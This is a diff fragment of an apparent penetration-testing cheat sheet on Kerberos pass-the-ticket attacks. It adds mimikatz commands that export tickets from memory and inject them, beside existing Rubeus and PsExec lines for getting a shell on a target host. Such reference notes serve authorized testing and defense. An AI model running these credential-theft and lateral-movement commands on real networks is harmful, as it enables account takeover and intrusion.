@@ -487,6 +487,15 @@ Make kirbi ticket from BASE64 blob
 5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
 6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`
 
+
+
+#### Using mimikatz
+
+```cmd
+sekurlsa::tickets /export
+kerberos::ptt [ticket name]
+```
+
 ### Silver Ticket
 Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets
 
